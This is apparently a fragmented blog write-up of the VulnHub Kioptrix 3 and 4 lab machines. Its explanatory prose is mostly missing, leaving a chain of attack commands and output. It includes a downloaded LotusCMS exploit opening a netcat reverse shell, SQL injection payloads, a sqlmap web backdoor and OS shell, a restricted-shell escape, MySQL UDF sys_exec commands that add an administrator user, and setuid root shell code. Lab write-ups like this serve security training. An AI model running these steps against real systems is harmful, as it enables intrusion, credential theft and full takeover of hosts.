ls -l gallery total 156 drwxr-xr-x 2 root root 4096 Apr 12 -rw-r--r-- 1 root root 3573 Oct 10 -rw-r--r-- 1 root root 252 Apr 12 drwxr-xr-x 3 root root 4096 Apr 12 -rw-r--r-- 1 root root 214 Apr 12 -rw-r--r-- 1 root root 1440 Apr 14 -rw-r--r-- 1 root root 297 Apr 12 -rw-r--r-- 1 root root 38771 Apr 12 -rw-r--r-- 1 root root 1009 Apr 12 -rw-r--r-- 1 root root 249 Apr 12 -rw-r--r-- 1 root root 10340 Apr 12 -rw-r--r-- 1 root root 212 Apr 12 -rw-r--r-- 1 root root 213 Apr 12 -rw-r--r-- 1 root root 249 Apr 12 drwxrwxrwx 2 root root 4096 Apr 12 -rw-r--r-- 1 root root 213 Apr 12 -rw-r--r-- 1 root root 219 Apr 12 -rw-r--r-- 1 root root 214 Apr 12 -rw-r--r-- 1 root root 87 Oct 10 -rw-r--r-- 1 root root 213 Apr 12 -rw-r--r-- 1 root root 215 Apr 12 drwxr-xr-x 2 root root 4096 Apr 13 -rw-r--r-- 1 root root 213 Apr 12 -rw-r--r-- 1 root root 216 Apr 12 -rw-r--r-- 1 root root 211 Apr 12 drwxr-xr-x 6 root root 4096 Apr 12 -rw-r--r-- 1 root root 56 Oct 10 -rw-r--r-- 1 root root 211 Apr 12

2011 BACK 2009 db.sql 2011 g.php 2011 gadmin 2011 gallery.php 2011 gconfig.php 2011 gfooter.php 2011 gfunctions.php 2011 gheader.php 2011 index.php 2011 install.BAK 2011 login.php 2011 logout.php 2011 p.php 2011 photos 2011 photos.php 2011 post_comment.php 2011 profile.php 2009 readme.html 2011 recent.php 2011 register.php 2011 scopbin 2011 search.php 2011 slideshow.php 2011 tags.php 2011 themes 2009 version.txt 2011 vote.php

 gconfig.php  cat 

$GLOBALS["gallarific_path"] = "http://kioptrix3.com/gallery";
$GLOBALS["gallarific_mysql_server"] = "localhost"; $GLOBALS["gallarific_mysql_database"] = "gallery"; $GLOBALS["gallarific_mysql_username"] = "root"; $GLOBALS["gallarific_mysql_password"] = "fuckeyou";

lotusRCE.sh

wget https://raw.githubusercontent.com/Hood3dRob1n/LotusCMS-Exploit/master/lotusRCE.sh

root@kali:~# chmod +x lotusRCE.sh root@kali:~# ./lotusRCE.sh 192.168.43.158

Path found, now to check for vuln....

</html>Hood3dRob1n Regex found, site is vulnerable to PHP Code Injection!

About to try and inject reverse shell.... what IP to use? 192.168.43.177 What PORT? 2333

OK, open your local listener and choose the method for back connect:

1) NetCat -e

3) NetCat Backpipe 5) Exit

2) NetCat /dev/tcp 4) NetCat FIFO

#? 1

root@kali:/tmp# nc -lvp 2333 listening on [any] 2333 ... connect to [192.168.43.177] from kioptrix3.com [192.168.43.158] 56259 whoami www-data id uid=33(www-data) gid=33(www-data) groups=33(www-data)



SQL

Database: gallery

Table: dev_accounts

[2 entries]

+----+------------+---------------------------------------------+

| id | username | password

|

+----+------------+---------------------------------------------+

| 1 | dreg

| 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r) |

| 2 | loneferret | 5badcaf789d3d1d09794d8f021f40f0e (starwars) |

+----+------------+---------------------------------------------+

SSH 

root@kali:~# ssh loneferret@192.168.43.158 loneferret@192.168.43.158's password: Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686
The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright.
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law.
To access official Ubuntu documentation, please visit: http://help.ubuntu.com/ Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106 loneferret@Kioptrix3:~$ ls checksec.sh CompanyPolicy.README
 CompanyPolicy.README .
checksec.sh CompanyPolicy.README loneferret@Kioptrix3:~$ cat CompanyPolicy.README Hello new employee, It is company policy here to use our newly installed software for editing, creating and viewing files. Please use the command 'sudo ht'. Failure to do so will result in you immediate termination.
DG CEO
 sudo ht  kali
loneferret@Kioptrix3:~$ sudo ht Error opening terminal: xterm-256color.
 xterm-256color.   xshell 

 F3  /etc/passwd  /etc/sudoers 

/etc/passwd root 

/etc/sudoers root 
SSH root@kali:~# ssh loneferret@192.168.43.158 loneferret@192.168.43.158's password: Last login: Tue May 8 19:27:01 2018 from uknow-pc Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. To access official Ubuntu documentation, please visit: http://help.ubuntu.com/ root@Kioptrix3:~# id uid=0(root) gid=0(root) groups=0(root),100(users) root@Kioptrix3:~# whoami root
 root 


 phpmyadmin  shell phpmyadmin  general log  SQL sqlmap  root  os-shell shell   phpmyadmin  INTO OUTFILE  #1 - Can't create/write to file   shell   vulnhub   linux 
 Vulnhub-Kioptrix 4
title: Vulnhub-Kioptrix 4 date: 2018-05-17 13:46:30 tags:
Ukonw


 nmap 

root@kali:~# nmap -sS -A 10.32.58.187

Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-17 01:57 EDT

Nmap scan report for 10.32.58.187

Host is up (0.00037s latency).

Not shown: 566 closed ports, 430 filtered ports

PORT STATE SERVICE

VERSION

22/tcp open ssh

OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)

| ssh-hostkey:

| 1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)

|_ 2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)

80/tcp open http

Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)

|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch

|_http-title: Site doesn't have a title (text/html).

139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

445/tcp open netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)

MAC Address: 00:0C:29:38:2D:6F (VMware)

Device type: general purpose

Running: Linux 2.6.X

OS CPE: cpe:/o:linux:linux_kernel:2.6

OS details: Linux 2.6.9 - 2.6.33 Network Distance: 1 hop Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results: |_clock-skew: mean: 10h00m00s, deviation: 2h49m43s, median: 7h59m59s |_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown) | smb-os-discovery: | OS: Unix (Samba 3.0.28a) | Computer name: Kioptrix4 | NetBIOS computer name: | Domain name: localdomain | FQDN: Kioptrix4.localdomain |_ System time: 2018-05-17T09:58:07-04:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE

HOP RTT

ADDRESS

1 0.37 ms 10.32.58.187

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21.81 seconds


22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0) 80/tcp open http Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)
80WEB

 'or 1=1#   admin:admin   admin:'  /var/www/checklogin.php 
POST

sqlmapSQL
sqlmap -u http://10.32.58.187/checklogin.php --data="myusername=admin&mypassword=123&Submit=Login" -p mypassword --current-user --current-db --is-dba  302  n 
sqlmap identified the following injection point(s) with a total of 253 HTTP(s) requests: --Parameter: mypassword (POST)
Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment) Payload: myusername=admin&mypassword=-8260' OR 6555=6555#&Submit=Login Type: AND/OR time-based blind Title: MySQL >= 5.0.12 OR time-based blind

Payload: myusername=admin&mypassword=123' OR SLEEP(5)-- UeQF&Submit=Login --[02:00:45] [INFO] the back-end DBMS is MySQL web server operating system: Linux Ubuntu 8.04 (Hardy Heron) web application technology: PHP 5.2.4, Apache 2.2.8 back-end DBMS: MySQL >= 5.0.12 [02:00:45] [INFO] fetching current user [02:00:45] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval [02:00:45] [INFO] retrieved: root@localhost current user: 'root@localhost' [02:00:45] [INFO] fetching current database [02:00:45] [INFO] retrieved: members current database: 'members' [02:00:45] [INFO] testing if current user is DBA [02:00:45] [INFO] fetching current user current user is DBA: True [02:00:45] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.32.58.187'
[*] shutting down at 02:00:45


Database: members

Table: members

[2 entries]

+----+----------+-----------------------+

| id | username | password

|

+----+----------+-----------------------+

| 1 | john

| MyNameIsJohn

|

| 2 | robert | ADGAdsafdfwt4gadfga== |

+----+----------+-----------------------+

 --os-shell  webshell 

root@kali:~# sqlmap -u http://10.32.58.187/checklogin.php --

data="myusername=admin&mypassword=123&Submit=Login" -p mypassword --os-shell

___

__H__

___ ___[']_____ ___ ___ {1.2.4#stable}

|_ -| . [.]

| .'| . |

|___|_ [(]_|_|_|__,| _|

|_|V

|_| http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 02:09:06

[02:09:06] [INFO] resuming back-end DBMS 'mysql' [02:09:06] [INFO] testing connection to the target URL [02:09:06] [INFO] heuristics detected web page charset 'ascii' sqlmap resumed the following injection point(s) from stored session: --Parameter: mypassword (POST)
Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment) Payload: myusername=admin&mypassword=-8260' OR 6555=6555#&Submit=Login
Type: AND/OR time-based blind Title: MySQL >= 5.0.12 OR time-based blind Payload: myusername=admin&mypassword=123' OR SLEEP(5)-- UeQF&Submit=Login --[02:09:06] [INFO] the back-end DBMS is MySQL web server operating system: Linux Ubuntu 8.04 (Hardy Heron) web application technology: PHP 5.2.4, Apache 2.2.8 back-end DBMS: MySQL >= 5.0.12 [02:09:06] [INFO] going to use a web backdoor for command prompt [02:09:06] [INFO] fingerprinting the back-end DBMS operating system [02:09:06] [INFO] the back-end DBMS operating system is Linux which web application language does the web server support? [1] ASP [2] ASPX [3] JSP [4] PHP (default) > 4 [02:09:08] [INFO] retrieved the web server document root: '/var/www' [02:09:08] [INFO] retrieved web server absolute paths: '/var/www/checklogin.php' [02:09:08] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method [02:09:08] [INFO] the file stager has been successfully uploaded on '/var/www/' http://10.32.58.187:80/tmpuadle.php [02:09:08] [WARNING] unable to upload the file through the web file stager to '/var/www/' [02:09:08] [WARNING] backdoor has not been successfully uploaded through the file stager possibly because the user running the web server process has not write privileges over the folder where the user running the DBMS process was able to upload the file stager or because the DBMS and web server sit on different servers do you want to try the same method used for the file stager? [Y/n] [02:09:09] [INFO] the backdoor has been successfully uploaded on '/var/www/' http://10.32.58.187:80/tmpbcphh.php [02:09:09] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER os-shell> id do you want to retrieve the command standard output? [Y/n/a] command standard output: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)' os-shell> whoami do you want to retrieve the command standard output? [Y/n/a] command standard output: 'www-data' os-shell> cat checklogin.php do you want to retrieve the command standard output? [Y/n/a] command standard output: --<?php

ob_start(); $host="localhost"; // Host name $username="root"; // Mysql username $password=""; // Mysql password $db_name="members"; // Database name $tbl_name="members"; // Table name

SSH
SQLSSH
root@kali:~# ssh john@10.32.58.187 The authenticity of host '10.32.58.187 (10.32.58.187)' can't be established. RSA key fingerprint is SHA256:3fqlLtTAindnY7CGwxoXJ9M2rQF6nn35SFMTVv56lww. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added '10.32.58.187' (RSA) to the list of known hosts. john@10.32.58.187's password: Welcome to LigGoat Security Systems - We are Watching == Welcome LigGoat Employee == LigGoat Shell is in place so you don't screw up Type '?' or 'help' to get the list of allowed commands john:~$ id *** unknown command: id john:~$ ? cd clear echo exit help ll lpath ls john:~$ help help Limited Shell (lshell) limited help. Cheers.

cd clear echo exit help ll lpath ls
 echo   bashshell
john:~$ echo os.system('/bin/bash') john@Kioptrix4:~$ id uid=1001(john) gid=1001(john) groups=1001(john)

MySQL
SQLMySQL
john@Kioptrix4:~$ mysql -u root -p Enter password:

Welcome to the MySQL monitor. Commands end with ; or \g. Your MySQL connection id is 3520 Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> status; -------------mysql Ver 14.12 Distrib 5.0.51a, for debian-linux-gnu (i486) using readline 5.2

Connection id:

Current database:

Current user:

SSL:

Current pager:

Using outfile:

Using delimiter:

Server version:

Protocol version:

Connection:

Server characterset:

Db

characterset:

Client characterset:

Conn. characterset:

UNIX socket:

Uptime:

3520
root@localhost Not in use stdout '' ; 5.0.51a-3ubuntu5.4 (Ubuntu) 10 Localhost via UNIX socket latin1 latin1 latin1 latin1 /var/run/mysqld/mysqld.sock 1 hour 10 min 47 sec

 mysql udf   Windows

USE mysql; CREATE TABLE npn(line blob); INSERT INTO npn values(load_file('C://xampplite//htdocs//mail//lib_mysqludf_sys.dll')); SELECT * FROM mysql.npn INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll'; CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll'; SELECT sys_exec("net user npn npn12345678 /add"); SELECT sys_exec("net localgroup Administrators npn /add");

LinuxUDF
 lib_mysqludf_sys.so 

john@Kioptrix4:~$ whereis lib_mysqludf_sys.so lib_mysqludf_sys: /usr/lib/lib_mysqludf_sys.so

mysql> use mysql; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A

Database changed mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys.so'; ERROR 1125 (HY000): Function 'sys_exec' already exists mysql> select sys_exec('id > /tmp/out; chown john.john /tmp/out'); ERROR 2006 (HY000): MySQL server has gone away No connection. Trying to reconnect... Connection id: 1 Current database: mysql

+-----------------------------------------------------+

| sys_exec('id > /tmp/out; chown john.john /tmp/out') |

+-----------------------------------------------------+

| NULL

|

+-----------------------------------------------------+

1 row in set (0.00 sec)

mysql> quit Bye john@Kioptrix4:~$ cat /tmp/out uid=0(root) gid=0(root)

 sys_exec()  /tmp/out  root c

#include <stdio.h> #include <sys/types.h> #include <unistd.h> int main(void) { setuid(0); setgid(0); system("/bin/bash"); }

wget

mysql> SELECT sys_exec('usermod -a -G admin'); ERROR 2013 (HY000): Lost connection to MySQL server during query mysql> SELECT sys_exec('usermod -a -G admin john'); ERROR 2006 (HY000): MySQL server has gone away No connection. Trying to reconnect... Connection id: 1 Current database: mysql

+--------------------------------------+

| sys_exec('usermod -a -G admin john') |

+--------------------------------------+

| NULL

|

+--------------------------------------+

1 row in set (0.07 sec)
 SELECT sys_exec('usermod -a -G admin');  john 
john@Kioptrix4:/tmp$ sudo su [sudo] password for john: root@Kioptrix4:/tmp# id uid=0(root) gid=0(root) groups=0(root) root@Kioptrix4:/tmp# whoami root
root

